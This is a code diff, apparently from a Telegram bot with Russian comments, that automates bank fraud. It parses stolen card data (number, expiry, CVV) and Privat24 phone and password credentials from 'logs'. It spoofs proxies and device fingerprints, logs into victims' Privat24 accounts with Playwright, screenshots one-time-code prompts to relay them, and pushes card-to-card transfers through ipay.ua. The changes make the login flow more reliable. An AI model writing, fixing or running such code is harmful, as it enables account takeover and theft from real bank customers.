@@ -33,11 +33,9 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot, storage=storage)
 dp.middleware.setup(LoggingMiddleware())
 
-# ========== FSM ==========
 class PaymentStates(StatesGroup):
     waiting_code = State()
 
-# ========== КНОПКИ ==========
 def get_main_menu():
     kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
@@ -51,7 +49,6 @@ def get_action_keyboard(session_id):
     )
     return kb
 
-# ========== БАЗА ==========
 def init_db():
     os.makedirs("/var/data", exist_ok=True)
     conn = sqlite3.connect(DB_PATH)
@@ -142,7 +139,6 @@ def cleanup_sessions():
     conn.commit()
     conn.close()
 
-# ========== ПАРСЕР ==========
 def parse_log(text):
     data = {"card": None, "expiry": None, "cvv": None, "phone": None, "password": None, "ip": None, "user_agent": None, "device_model": None, "mode": None}
     lines = text.split("\n")
@@ -174,7 +170,6 @@ def parse_log(text):
     if not data["ip"]: data["ip"] = get_setting('proxy') or "auto"
     if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
     if not data["device_model"]: data["device_model"] = "Android Generic"
-    
     if data.get("phone") and data.get("password"):
         data["mode"] = "privat24"
     elif data.get("card") and data.get("expiry") and data.get("cvv"):
@@ -183,7 +178,6 @@ def parse_log(text):
         data["mode"] = "unknown"
     return data
 
-# ========== РОТАЦИЯ ==========
 def rotate_proxy():
     rotation_url = get_setting('rotation_url')
     if not rotation_url:
@@ -200,7 +194,6 @@ def rotate_proxy():
         pass
     return get_setting('proxy'), get_setting('proxy_type')
 
-# ========== ГЛОБАЛЬНЫЙ КОНТЕКСТ ДЛЯ СКРИНШОТОВ ==========
 page_contexts = {}
 
 def save_page_context(session_id, page, browser):
@@ -211,9 +204,14 @@ def get_page_context(session_id):
 
 def clear_page_context(session_id):
     if session_id in page_contexts:
+        try:
+            if page_contexts[session_id].get("browser"):
+                import asyncio
+                asyncio.create_task(page_contexts[session_id]["browser"].close())
+        except:
+            pass
         del page_contexts[session_id]
 
-# ========== СКРИНШОТ (БЫСТРЫЙ) ==========
 async def take_fast_screenshot(session_id):
     context = get_page_context(session_id)
     if context and context.get("page"):
@@ -224,9 +222,17 @@ async def take_fast_screenshot(session_id):
             return None
     return None
 
-# ========== ВХОД В ПРИВАТ24 ==========
+# ========== ВХОД В ПРИВАТ24 (ИСПРАВЛЕННЫЙ) ==========
 async def login_privat24(session_id, phone, password, user_agent=None, proxy_str=None, proxy_type="http"):
     try:
+        # Убираем +380 из номера, так как поле уже содержит +380
+        if phone.startswith("380"):
+            phone = phone[3:]
+        elif phone.startswith("+380"):
+            phone = phone[4:]
+        # Оставляем только цифры
+        phone = re.sub(r"\D", "", phone)
+        
         async with async_playwright() as p:
             browser_args = []
             if proxy_str:
@@ -243,41 +249,44 @@ async def login_privat24(session_id, phone, password, user_agent=None, proxy_str
                 viewport={"width": 1280, "height": 720}
             )
             page = await context.new_page()
-            
-            # Сохраняем контекст для быстрых скриншотов
             save_page_context(session_id, page, browser)
             
-            # ШАГ 1: Открываем главную
             await page.goto("https://next.privat24.ua", wait_until="networkidle", timeout=30000)
             await asyncio.sleep(1)
             
-            # ШАГ 2: Нажимаем "Вхід"
+            # Нажимаем "Вхід"
             login_btn = await page.wait_for_selector('a:has-text("Вхід"), button:has-text("Вхід")', timeout=10000)
             if login_btn:
                 await login_btn.click()
                 await asyncio.sleep(1)
             
-            # ШАГ 3: Вводим номер
+            # Вводим номер (без +380)
             phone_input = await page.wait_for_selector('input[name="phone"], input[type="tel"]', timeout=10000)
             if phone_input:
                 await phone_input.fill(phone)
                 await asyncio.sleep(0.5)
-                submit_btn = await page.wait_for_selector('button[type="submit"], button:has-text("Продовжити")', timeout=5000)
+                submit_btn = await page.wait_for_selector('button:has-text("Продовжити"), button[type="submit"]', timeout=5000)
                 if submit_btn:
                     await submit_btn.click()
                     await asyncio.sleep(1)
+                else:
+                    await page.keyboard.press("Enter")
+                    await asyncio.sleep(1)
             
-            # ШАГ 4: Вводим пароль
+            # Вводим пароль
             password_input = await page.wait_for_selector('input[name="password"], input[type="password"]', timeout=10000)
             if password_input:
                 await password_input.fill(password)
                 await asyncio.sleep(0.5)
-                login_submit = await page.wait_for_selector('button[type="submit"], button:has-text("Увійти")', timeout=5000)
+                login_submit = await page.wait_for_selector('button:has-text("Увійти"), button[type="submit"]', timeout=5000)
                 if login_submit:
                     await login_submit.click()
                     await asyncio.sleep(2)
+                else:
+                    await page.keyboard.press("Enter")
+                    await asyncio.sleep(2)
             
-            # ШАГ 5: Проверяем код
+            # Проверяем код
             code_input = await page.query_selector('input[name="code"]')
             if code_input:
                 screenshot = await page.screenshot()
@@ -293,7 +302,7 @@ async def login_privat24(session_id, phone, password, user_agent=None, proxy_str
     except Exception as e:
         return {"status": "error", "message": f"❌ Ошибка: {str(e)[:100]}"}
 
-# ========== ПЕРЕВОД ЧЕРЕЗ IPAY ==========
+# ========== ПЕРЕВОД ==========
 async def make_payment(session_id, card_from, expiry, cvv, card_to, amount, proxy_str=None, proxy_type="http"):
     try:
         async with async_playwright() as p:
@@ -310,8 +319,6 @@ async def make_payment(session_id, card_from, expiry, cvv, card_to, amount, prox
                 viewport={"width": 1280, "height": 720}
             )
             page = await context.new_page()
-            
-            # Сохраняем контекст для скриншотов
             save_page_context(session_id, page, browser)
             
             await page.goto("https://ipay.ua/card2card", wait_until="networkidle", timeout=30000)
